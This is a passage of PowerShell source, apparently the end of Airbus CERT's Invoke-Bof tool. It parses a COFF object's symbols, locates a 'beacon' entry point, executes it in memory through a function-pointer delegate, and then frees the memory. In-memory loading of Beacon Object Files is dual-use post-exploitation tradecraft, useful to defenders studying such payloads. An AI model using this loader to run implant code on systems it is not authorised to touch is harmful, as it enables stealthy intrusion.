            if ($SymbolEntry.StorageCLass -ne $Win32Constants.IMAGE_SYM_CLASS_EXTERNAL -and $SymbolEntry.StorageCLass -ne $Win32Constants.IMAGE_SYM_CLASS_STATIC -and $SymbolEntry.StorageCLass -ne $Win32Constants.IMAGE_SYM_CLASS_LABEL)
            {
                continue
            }

            if ($SymbolEntry.Value1 -eq 0)
            {

                [IntPtr]$SymbolPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SymbolValuePtr) ($SymbolEntry.Value2))
                $SymbolStr = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($SymbolPtr)
                $SymbolEntryNamed | Add-Member -MemberType NoteProperty -Name 'SymbolName' -Value ($SymbolStr)
            }
            else
            {
                $SymbolName = [System.Text.Encoding]::Default.GetString($SymbolEntryNamed.Name)
                $SymbolEntryNamed | Add-Member -MemberType NoteProperty -Name 'SymbolName' -Value ($SymbolName)
            }

            $SymbolEntryTable += ,$SymbolEntryNamed
        }

        $CoffInfo | Add-Member -MemberType NoteProperty -Name 'Symbols' -Value ($SymbolEntryTable)

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedCoffBytes)

        return $CoffInfo
    }

    Function Unload-Bof
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [System.Object]
        $Bof,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        foreach($CurrentSection in $Bof.Sections)
        {
            if ($CurrentSection.IMAGE_SECTION_HEADER.SizeOfRawData -ne 0)
            {
                $Win32Functions.VirtualFree.Invoke($CurrentSection.Handle, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
    }

    Function Start-Bof
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [System.Object]
        $Bof,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $EntryPoint,

        [Parameter( Position = 2, Mandatory = $true )]
        [IntPtr]
        $ArgumentBytes,

        [Parameter( Position = 3, Mandatory = $true )]
        [int]
        $ArgumentBytesLength
        )

        foreach($Symbol in $Bof.Symbols)
        {
            if ($Symbol.SymbolName -eq $EntryPoint)
            {
                [IntPtr]$EntryPointAddr = [IntPtr](Add-SignedIntAsUnsigned ($Bof.Sections[$Symbol.SectionNumber - 1].Handle) ($Symbol.Value))
                
                # Create a delegate for classic beacon entry point
                $EntrypPointDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
                $EntrypPoint = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EntryPointAddr, $EntrypPointDelegate)

                Write-Host "[+] Jump into beacon at" ("0x{0:x4}" -f [Int64]$EntryPointAddr)

                Write-Host "****************************************************************************"
                $EntrypPoint.Invoke($ArgumentBytes, $ArgumentBytesLength) | Out-Null
                Write-Host "****************************************************************************"
                return
            }
        }

        Write-Error ("Unable to find entry point name "+$EntryPoint)
    }

    Write-Host "

██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
                                               
  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]


"

    # Retrieve Win32 Types
    $Win32Types = Get-Win32Types

    # Retrieve all Win32 functions
    $Win32Functions = Get-Win32Functions

    # Retrieve all Win32 constants
    $Win32Constants = Get-Win32Constants

    # Retrieve all Beacon types
    $BeaconTypes = Get-BeaconTypes

    # Retrieve all Beacon API
    $BeaconAPI = Get-BeaconAPI -BeaconTypes $BeaconTypes -Win32Functions $Win32Functions

    # Load bof in memory
    $bof = Load-Bof -CoffBytes $BOFBytes -Win32Types $Win32Types -Win32Functions $Win32Functions -Win32Constants $Win32Constants -BeaconAPI $BeaconAPI

    # Marshal parameters in memory
    $ArgumentsBytes = [IntPtr]::Zero;
    $ArgumentsBytesLength = 0
    if ($ArgumentList -ne $null)
    {
        $ArgumentsBytes, $ArgumentsBytesLength = Load-BeaconParameters -ArgumentList $ArgumentList -UnicodeStringParameter $UnicodeStringParameter
    }

    # Start bof in memory
    Start-Bof -Bof $bof -EntryPoint $EntryPoint -ArgumentBytes $ArgumentsBytes -ArgumentBytesLength $ArgumentsBytesLength

    # Release unmanaged ressources for arguments
    if($ArgumentsBytes -ne [IntPtr]::Zero)
    {
        Unload-BeaconParameters -ArgumentBytes $ArgumentsBytes
    }

    # Release unmanaged ressource for entire bof
    Unload-Bof -Bof $bof -Win32Functions $Win32Functions -Win32Constants $Win32Constants
}
